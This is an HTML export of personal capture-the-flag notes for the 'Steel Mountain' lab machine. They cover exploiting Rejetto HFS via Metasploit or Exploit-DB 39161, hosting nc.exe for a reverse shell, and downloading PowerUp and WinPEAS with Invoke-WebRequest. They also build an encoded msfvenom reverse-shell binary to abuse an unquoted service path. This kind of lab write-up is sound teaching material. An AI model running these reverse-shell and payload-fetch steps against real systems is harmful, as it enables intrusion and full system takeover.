<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>steel mountain</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>steel mountain</h1><br/><p><strong>Steel Mountain</strong></p><p></p><p>Hello</p><p></p><p>nmap -Pn -T4 -sV 10.10.118.196</p><p></p><p><img src="images/5-1.png" alt="images/5-1.png" /></p><p></p><p></p><p><img src="images/5-2.png" alt="images/5-2.png" /></p><p></p><p><strong>Foothold:</strong></p><p><strong>Way -1:</strong></p><p><strong>Metasploit:</strong></p><p></p><p>Search HTTP File Server</p><p><em><strong>exploit/windows/http/rejetto_hfs_exec</strong></em></p><p></p><p>set options for:</p><p>RHOST - Target_IP</p><p>RPORT - Target_Port</p><p></p><p>SRVHOST -Attacker IP to start webserver (Optional)</p><p>SRVPORT -Attacker Port to Start websever (Optional)</p><p></p><p>Set Payload:</p><p>windows/meterpreter/reverse_tcp</p><p>LHOST - Attacker IP</p><p>LPORT - Attacker Port to Listen for reverse shell</p><p></p><p></p><p>Run/exploit </p><p></p><p></p><p>With the received meterpreter session.</p><p>Get the user flag at C:\Users\Bill\Desktop\user.txt</p><p></p><p></p><p><strong>Way-2:</strong></p><p><strong>Python Code from Exploit-DB:</strong></p><p></p><p><em><strong>searchsploit -m windows/remote/39161.py</strong></em></p><p></p><p>1. Edit the file and change the <em><strong>Local IP address</strong></em> and <em><strong>Local Port</strong></em> inside the file to Attacker Details.</p><p>2. Download netcat.exe for windows and name it to nc.exe.</p><p>3. Host nc.exe as it will be accessible as <em><strong>http://&lt;attackers_ip&gt;:80/nc.exe</strong></em></p><p>		From the downloaded/renamed location run <em><strong>python2 -m SimpleHTTPServer 80</strong></em></p><p>4. Start nc on attacker on listen mode(As per port provided in the python file)</p><p>		<em><strong>nc -lvnp Local Port</strong></em></p><p>5. Run the exploit using python2: <em><strong>python2 39161.py &lt;target_IP&gt; &lt;Target_Port&gt;</strong></em></p><p></p><p>We will get limited powershell on nc listener with user preveleges.</p><p></p><p><strong>Prevelege Escalation:</strong></p><p></p><p>Either using meterpreter upload <strong>PowerUp.ps1</strong> or <strong>WinPEASx64.exe</strong></p><p>Then go into a powershell instance by following:</p><p></p><p><strong>Meterpterter Commands to Interact with Powershell:</strong></p><p><em><strong>load powershell	</strong></em>							:	Loads the powershell extention of meterpreter</p><p><em><strong>powershell_shell	</strong></em>							:	Starts a powershell in the target machine.</p><p></p><p>Or</p><p></p><p>For normal shell use the following to upload the files.</p><p>	1. Start a webserver where the exectuibles are located by: <em><strong>python2 -m SimpleHTTPServer 80</strong></em></p><p>	2. <em><strong>powershell -c Invoke-WebRequest -Uri &lt;URL&gt; -OutFile </strong></em><strong>&lt;OUTPUT-FILENAME&gt;</strong></p><p>		eg. <em><strong>powershell -c Invoke-WebRequest -Uri http://10.11.72.31/THM_WinPrivEsc_Tools/winPEASx64.exe -OutFile winPEASx64.exe</strong></em></p><p>		</p><p></p><p><strong>Powershell commands to add a module and run it:</strong></p><p></p><p><strong>Import-Module .\PowerUp.ps1</strong></p><p><strong>Invoke-AllChecks</strong></p><p>or</p><p><strong>. .\PowerUp.ps1</strong></p><p><strong>Invoke-AllChecks</strong></p><p></p><p><img src="images/5-3.png" alt="images/5-3.png" /></p><p></p><p>We use  the unquoted service path vulnerability for <strong>AdvancesSystemCareService9</strong>. The service also has <strong>CanRestrat True</strong>.</p><p>Thus we can stop and start the service after we inject our payload to the <strong>C:\Program Files (x86)\IObit</strong> Directory</p><p></p><p><strong>Name of Payload: Advanced.exe</strong></p><p><em><strong>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.X.X PORT=XXXX -e x86/shikata_ga_nai -f exe-service -o Advanced.exe</strong></em></p><p></p><p>Copy this <strong>Advanced.exe</strong> to <strong>C:\Program Files (x86)\IObit</strong>.</p><p>Open a reverse shell listener on attacker PC.</p><p></p><p>Then restart the service as follows:</p><p></p><p><em><strong>sc stop AdvancesSystemCareService9</strong></em></p><p><em><strong>sc start AdvancesSystemCareService9</strong></em></p><p></p><p>Now we have <strong>nt authority\system</strong> shell in the listener.</p><p>Get the flag from <strong>C:\Users\Administrator\Desktop\root.txt</strong></p><p></p><p>Note: if we use <strong>WinPEASx64.exe</strong>, we get the same hints about unquoted service path vulnerability and exploit the same way.</p><p></p><p>Thanks!!</p></div>
</body>
</html>
